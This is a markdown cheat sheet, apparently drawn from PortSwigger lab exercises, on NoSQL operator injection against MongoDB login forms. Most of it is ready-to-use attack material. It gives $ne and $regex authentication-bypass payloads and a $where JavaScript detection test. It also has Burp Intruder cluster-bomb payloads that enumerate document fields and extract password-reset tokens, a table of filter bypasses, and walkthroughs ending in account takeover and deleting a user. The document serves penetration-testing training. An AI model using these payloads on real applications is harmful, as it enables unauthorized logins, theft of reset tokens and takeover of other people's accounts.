# NoSQL injection — Operator injection

When a MongoDB query accepts JSON from the request body directly, injecting operator objects (`{"$ne":""}`, `{"$regex":"..."}`) bypasses authentication. Adding `"$where"` with JS expressions enables field-name enumeration and token value extraction to take over arbitrary accounts.

## Quick reference
```
# Auth bypass (POST /login JSON body)
{"username":{"$ne":""},"password":{"$ne":""}}          -> logs in (first user matched)
{"username":{"$regex":"admin.*"},"password":{"$ne":""}} -> logs in as admin
{"username":{"$ne":""},"password":{"$ne":""}}           -> if "multiple users" error, tighten regex

# Detect $where execution
POST /login  {"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
  -> Invalid username/password  (false JS → no match)
POST /login  {"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
  -> Account locked  (true JS → user matched, different branch)

# Enumerate field names (cluster bomb)
"$where":"Object.keys(this)[§1§].match('^.{§§}§§.*')"
# pos for key index (1, 2, 3...), pos for char position, pos for char value

# Extract token value (cluster bomb)
"$where":"this.TOKENNAME.match('^.{§§}§§.*')"
# confirm token name by testing GET /forgot-password?TOKENNAME=invalid -> "Invalid token"
```

## Root cause
MongoDB queries accept JSON documents; when the application passes `req.body` directly as the query object (e.g., `db.users.findOne({username: req.body.username, password: req.body.password})`), an attacker can substitute string values with MongoDB operator objects. The `$where` operator evaluates arbitrary JavaScript in the query context, exposing all document fields.

## Find it
1. Login endpoint: change `"username":"wiener"` to `{"$ne":""}` — different response? Operator injection works.
2. Add `"$where":"0"` then `"$where":"1"` to any JSON request — different responses = JS evaluated.
3. Even when you can't log in (account locked, no password), `$ne` on password field changes the response — that's enough to confirm injection.

## Technique

### Auth bypass ($ne / $regex)
1. Intercept `POST /login` (JSON body).
2. Change `"username":"wiener"` → `"username":{"$ne":""}` → sends request; if response changes (200/redirect) → injected.
3. Change `"password":"peter"` → `"password":{"$ne":""}` as well → may match multiple users.
4. Tighten with regex: `"username":{"$regex":"admin.*"}` → first user whose username starts with "admin" is returned.
5. Log in as admin.

### Field name enumeration + token exfiltration ($where)
Goal: access carlos's account when password is unknown and reset requires email you don't control.

1. Confirm `$ne` works: `{"username":"carlos","password":{"$ne":"invalid"}}` → "Account locked" (user found, wrong password flow).
2. Confirm `$where`: add `"$where":"0"` → "Invalid username/password"; add `"$where":"1"` → "Account locked". Different responses = $where evaluated.
3. Enumerate field names:
   - Payload: `"$where":"Object.keys(this)[§KEY_IDX§].match('^.{§CHAR_POS§}§CHAR§.*')"`
   - KEY_IDX: 0, 1, 2, 3… (index into keys array; skip known fields like username/password)
   - CHAR_POS: 0 to ~20
   - CHAR: a-z A-Z 0-9
   - Account locked response = character matched
   - Assemble chars for each key index → reveals field names
4. Find a field name that looks like a reset token (e.g., `forgotPwd`, `resetToken`, `pwdResetTkn`).
5. Verify: `GET /forgot-password?YOURTOKENNAME=invalid` → "Invalid token" = correct endpoint and field name.
6. Extract token value for carlos:
   - Payload: `"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"`
   - Same cluster bomb (char pos + char value)
   - Account locked = char matched; assemble full token
7. Submit token: `GET /forgot-password?YOURTOKENNAME=<TOKEN>` → reset carlos's password → log in.

## Payload arsenal
```json
// Auth bypass — any user
{"username":{"$ne":""},"password":{"$ne":""}}

// Auth bypass — admin specifically
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}

// $where detection
{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}

// Field name enum (Intruder cluster bomb — 3 positions)
{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[§1§].match('^.{§0§}§a§.*')"}
// pos1 = key index (1,2,3...), pos2 = char position (0..20), pos3 = char value (a-z A-Z 0-9)

// Token value extraction (Intruder cluster bomb — 2 positions)
{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.TOKENNAME.match('^.{§0§}§a§.*')"}
// pos1 = char position, pos2 = char value
```

## Bypasses
| Defense | Bypass |
|---|---|
| `$ne` blocked | try `$gt`, `$gte`, `$in` — any comparison operator |
| `$where` blocked | try field enumeration via `$regex` with partial match |
| JSON body rejected | try URL-encoded body with `username[$ne]=` syntax |
| "Account locked" not triggered | adjust operand — look for ANY response difference |

## Exploitation walkthrough

**Lab 1 (Auth bypass):**
1. POST /login → `"username":{"$ne":""},"password":{"$ne":""}` → logs in.
2. Try `"username":{"$regex":"admin.*"},"password":{"$ne":""}` → logs in as admin → admin panel → delete carlos → lab solved.

**Lab 2 (Extract unknown fields):**
1. carlos + `{"$ne":"invalid"}` → "Account locked" confirms injection.
2. `"$where":"0"` vs `"$where":"1"` → different responses confirm JS eval.
3. Cluster bomb field name enum (Object.keys) → find reset token field name.
4. Verify: `GET /forgot-password?TOKENNAME=invalid` → "Invalid token".
5. Cluster bomb token value extraction via `this.TOKENNAME.match(...)`.
6. `GET /forgot-password?TOKENNAME=<VALUE>` → reset carlos password → log in → lab solved.

## Chaining
- Operator auth bypass → admin session → [Access-control](../../Access-control/) (delete users, escalate).
- Field enum + token exfil → arbitrary account takeover without knowing password.
- `$where` JS execution → potential side-channel timing attacks for larger datasets.

## Tools
- **Burp Repeater** — operator injection, $where detection
- **Burp Intruder (Cluster bomb)** — field name and token value enumeration; 3 positions for field names, 2 for values
- **Sort by response length** in Intruder results — "Account locked" response is longer/shorter than "Invalid username"

## Labs

### Exploiting NoSQL operator injection to bypass authentication [Apprentice]
POST /login JSON body: `"username":{"$ne":""},"password":{"$ne":""}` → logged in. Refine with `{"$regex":"admin.*"}` to target admin. Key insight: MongoDB query operators accepted as JSON values bypass equality checks entirely.

### Exploiting NoSQL operator injection to extract unknown fields [Practitioner]
`$ne` confirms vulnerability (Account locked). `$where` JS evaluation confirmed via 0/1 test. Cluster bomb with `Object.keys(this)[N].match(...)` enumerates all field names. Discover reset token field. Extract token value with `this.FIELD.match(...)` cluster bomb. Reset carlos's password. Key insight: `$where` turns NoSQL injection into arbitrary JS execution — any document field is readable.

## Real-world notes
- `username[$ne]=` (bracket syntax) works when the server accepts nested URL-encoded params and maps them to JSON-like objects (common in Express.js with `qs` parser).
- `$where` is disabled by default in newer MongoDB configs but still common in legacy deployments.
- Token exfiltration via `$where` is a full account takeover primitive — higher impact than auth bypass alone.
- Always test both `$ne` and `$regex` — some apps block one but not the other.

## References
- https://portswigger.net/web-security/nosql-injection
- https://portswigger.net/web-security/nosql-injection/nosql-databases
